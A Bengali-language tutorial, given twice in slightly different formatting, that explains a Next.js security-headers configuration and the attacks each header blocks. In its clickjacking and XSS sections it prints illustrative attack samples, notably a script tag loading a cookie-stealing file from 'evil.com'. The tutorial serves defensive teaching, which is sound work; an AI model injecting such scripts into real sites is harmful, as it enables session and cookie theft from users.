# Security Headers
```
const securityHeaders = [
  { key: "X-DNS-Prefetch-Control", value: "on" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  {
    key: "Content-Security-Policy",
    value: "default-src 'self'; script-src 'self' 'unsafe-inline';"
  },
]

module.exports = {
  async headers() {
    return [{ source: "/(.*)", headers: securityHeaders }]
  },
}
```
## Security Headers ব্যাখ্যা (বাংলায়)
এই কোডটি কেন দরকার?
যখন কেউ আপনার ওয়েবসাইট ভিজিট করে, সার্ভার শুধু HTML/CSS/JS পাঠায় না — সাথে HTTP Headers-ও পাঠায়। এই headers গুলো ব্রাউজারকে বলে দেয় "কীভাবে আচরণ করতে হবে"। Security headers যোগ করলে ব্রাউজার অনেক ধরনের আক্রমণ নিজেই আটকে দেয়।
### ১. X-DNS-Prefetch-Control: on
```
{ key: "X-DNS-Prefetch-Control", value: "on" }
```
কী করে?
ব্রাউজার আগে থেকেই DNS lookup করে রাখে, ফলে পেজ দ্রুত লোড হয়।
উদাহরণ: আপনার পেজে google.com-এর লিংক আছে — ব্রাউজার আগেই সেই IP খুঁজে রাখবে, ক্লিক করার পর দ্রুত যাবে।
### ২. X-Frame-Options: DENY
```
{ key: "X-Frame-Options", value: "DENY" }
```
কী করে?
আপনার সাইটকে অন্য কেউ <iframe>-এর ভেতরে লোড করতে পারবে না।
কোন আক্রমণ থেকে বাঁচায়? → Clickjacking
❌ হ্যাকার করতে চায়:
```
<iframe src="https://yourbank.com"></iframe>
<!-- আপনার ব্যাংক সাইট লোড করে উপরে fake বাটন বসায় -->
<!-- আপনি ভাবছেন নিজের বাটনে ক্লিক করছেন, আসলে ব্যাংকে ক্লিক হচ্ছে -->
✅ DENY দিলে: ব্রাউজার iframe লোড করবেই না
```
### ৩. X-Content-Type-Options: nosniff
```
{ key: "X-Content-Type-Options", value: "nosniff" }
```
কী করে?
ব্রাউজার ফাইলের ধরন নিজে নিজে "অনুমান" করার চেষ্টা করবে না।
কোন আক্রমণ থেকে বাঁচায়? → MIME Sniffing Attack
```
❌ সমস্যা:
হ্যাকার একটি .jpg ফাইল আপলোড করে, কিন্তু ভেতরে JavaScript কোড রাখে।
ব্রাউজার "স্মার্ট" হয়ে বলে "আরে এটা তো JS!" — এবং execute করে ফেলে!

✅ nosniff দিলে:
ব্রাউজার বলে "সার্ভার বলেছে এটা image, তাই image হিসেবেই ট্রিট করব"
```
### ৪. Referrer-Policy: strict-origin-when-cross-origin
```
{ key: "Referrer-Policy", value: "strict-origin-when-cross-origin" }
```
কী করে?
অন্য সাইটে যাওয়ার সময় আপনার সাইটের URL কতটুকু শেয়ার হবে তা নিয়ন্ত্রণ করে।
উদাহরণ:
```
আপনার সাইট: https://myapp.com/dashboard?token=abc123
ইউজার অন্য সাইটে ক্লিক করল

❌ Policy ছাড়া: অন্য সাইট দেখবে "?token=abc123" — বিপজ্জনক!
✅ এই Policy দিলে: শুধু "https://myapp.com" যাবে, secret কিছু না
```
### ৫. Permissions-Policy
```
{ key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" }
```
কী করে?
আপনার সাইট ক্যামেরা, মাইক্রোফোন, বা লোকেশন কখনোই ব্যবহার করতে পারবে না।
কেন দরকার?
```
❌ ছাড়া: আপনার সাইটে কোনো third-party script ঢুকে
          ইউজারের ক্যামেরা চালু করার চেষ্টা করতে পারে

✅ দিলে: ব্রাউজার সরাসরি block করবে, permission চাইতেও পারবে না
```
### ৬. Content-Security-Policy (CSP) ⭐ সবচেয়ে গুরুত্বপূর্ণ
```
{
  key: "Content-Security-Policy",
  value: "default-src 'self'; script-src 'self' 'unsafe-inline';"
}
```
কী করে?
ব্রাউজারকে বলে দেয় — "শুধু আমার নিজের সার্ভার থেকে আসা content লোড করো।"
কোন আক্রমণ থেকে বাঁচায়? → XSS (Cross-Site Scripting)
```
javascript// ❌ XSS Attack উদাহরণ:
// হ্যাকার কমেন্ট বক্সে এটা লেখে:
<script src="https://evil.com/steal-cookies.js"></script>

// CSP ছাড়া: ব্রাউজার এই script চালিয়ে দেবে!
// CSP দিলে: ব্রাউজার বলবে "evil.com allowed না, block!"
```

# Security Headers ব্যাখ্যা (বাংলায়)

## এই কোডটি কেন দরকার?

যখন কেউ আপনার ওয়েবসাইট ভিজিট করে, সার্ভার শুধু HTML/CSS/JS পাঠায় না — সাথে **HTTP Headers**-ও পাঠায়। এই headers গুলো ব্রাউজারকে বলে দেয় "কীভাবে আচরণ করতে হবে"। Security headers যোগ করলে ব্রাউজার অনেক ধরনের আক্রমণ নিজেই আটকে দেয়।

---

## প্রতিটি Header-এর বিস্তারিত ব্যাখ্যা

### ১. `X-DNS-Prefetch-Control: on`
```
{ key: "X-DNS-Prefetch-Control", value: "on" }
```
**কী করে?**
ব্রাউজার আগে থেকেই DNS lookup করে রাখে, ফলে পেজ দ্রুত লোড হয়।

**উদাহরণ:** আপনার পেজে `google.com`-এর লিংক আছে — ব্রাউজার আগেই সেই IP খুঁজে রাখবে, ক্লিক করার পর দ্রুত যাবে।

---

### ২. `X-Frame-Options: DENY`
```
{ key: "X-Frame-Options", value: "DENY" }
```
**কী করে?**
আপনার সাইটকে অন্য কেউ `<iframe>`-এর ভেতরে লোড করতে পারবে না।

**কোন আক্রমণ থেকে বাঁচায়? → Clickjacking**

```
❌ হ্যাকার করতে চায়:
<iframe src="https://yourbank.com"></iframe>
<!-- আপনার ব্যাংক সাইট লোড করে উপরে fake বাটন বসায় -->
<!-- আপনি ভাবছেন নিজের বাটনে ক্লিক করছেন, আসলে ব্যাংকে ক্লিক হচ্ছে -->

✅ DENY দিলে: ব্রাউজার iframe লোড করবেই না
```

---

### ৩. `X-Content-Type-Options: nosniff`
```
{ key: "X-Content-Type-Options", value: "nosniff" }
```
**কী করে?**
ব্রাউজার ফাইলের ধরন নিজে নিজে "অনুমান" করার চেষ্টা করবে না।

**কোন আক্রমণ থেকে বাঁচায়? → MIME Sniffing Attack**

```
❌ সমস্যা:
হ্যাকার একটি .jpg ফাইল আপলোড করে, কিন্তু ভেতরে JavaScript কোড রাখে।
ব্রাউজার "স্মার্ট" হয়ে বলে "আরে এটা তো JS!" — এবং execute করে ফেলে!

✅ nosniff দিলে:
ব্রাউজার বলে "সার্ভার বলেছে এটা image, তাই image হিসেবেই ট্রিট করব"
```

---

### ৪. `Referrer-Policy: strict-origin-when-cross-origin`
```
{ key: "Referrer-Policy", value: "strict-origin-when-cross-origin" }
```
**কী করে?**
অন্য সাইটে যাওয়ার সময় আপনার সাইটের URL কতটুকু শেয়ার হবে তা নিয়ন্ত্রণ করে।

**উদাহরণ:**
```
আপনার সাইট: https://myapp.com/dashboard?token=abc123
ইউজার অন্য সাইটে ক্লিক করল

❌ Policy ছাড়া: অন্য সাইট দেখবে "?token=abc123" — বিপজ্জনক!
✅ এই Policy দিলে: শুধু "https://myapp.com" যাবে, secret কিছু না
```

---

### ৫. `Permissions-Policy`
```
{ key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" }
```
**কী করে?**
আপনার সাইট ক্যামেরা, মাইক্রোফোন, বা লোকেশন **কখনোই** ব্যবহার করতে পারবে না।

**কেন দরকার?**
```
❌ ছাড়া: আপনার সাইটে কোনো third-party script ঢুকে
          ইউজারের ক্যামেরা চালু করার চেষ্টা করতে পারে

✅ দিলে: ব্রাউজার সরাসরি block করবে, permission চাইতেও পারবে না
```

---

### ৬. `Content-Security-Policy (CSP)` ⭐ সবচেয়ে গুরুত্বপূর্ণ
```
{
  key: "Content-Security-Policy",
  value: "default-src 'self'; script-src 'self' 'unsafe-inline';"
}
```
**কী করে?**
ব্রাউজারকে বলে দেয় — "শুধু **আমার নিজের সার্ভার** থেকে আসা content লোড করো।"

**কোন আক্রমণ থেকে বাঁচায়? → XSS (Cross-Site Scripting)**

```javascript
// ❌ XSS Attack উদাহরণ:
// হ্যাকার কমেন্ট বক্সে এটা লেখে:
<script src="https://evil.com/steal-cookies.js"></script>

// CSP ছাড়া: ব্রাউজার এই script চালিয়ে দেবে!
// CSP দিলে: ব্রাউজার বলবে "evil.com allowed না, block!"
```

| Rule | মানে |
|------|------|
| `default-src 'self'` | সব কিছু (image, font, etc.) শুধু নিজের সাইট থেকে |
| `script-src 'self'` | JavaScript শুধু নিজের সাইট থেকে |
| `'unsafe-inline'` | inline script allow (পরে সরানো উচিত) |

---

## সহজ ভাষায় সারসংক্ষেপ

| Header | সহজ কথায় |
|--------|-----------|
| X-DNS-Prefetch-Control | পেজ দ্রুত লোড করে |
| X-Frame-Options | iframe-এ চুরি আটকায় |
| X-Content-Type-Options | ফাইল ছদ্মবেশ আটকায় |
| Referrer-Policy | URL-এর secret লুকায় |
| Permissions-Policy | ক্যামেরা/মাইক বন্ধ রাখে |
| Content-Security-Policy | বাইরের script ঢুকতে দেয় না |

> **মূল কথা:** এই headers গুলো না দিলে আপনার সাইট technically কাজ করবে, কিন্তু হ্যাকারদের জন্য দরজা খোলা থাকবে। এগুলো যোগ করা **মাত্র কয়েক লাইনের কাজ**, কিন্তু সুরক্ষা অনেক বেড়ে যায়।
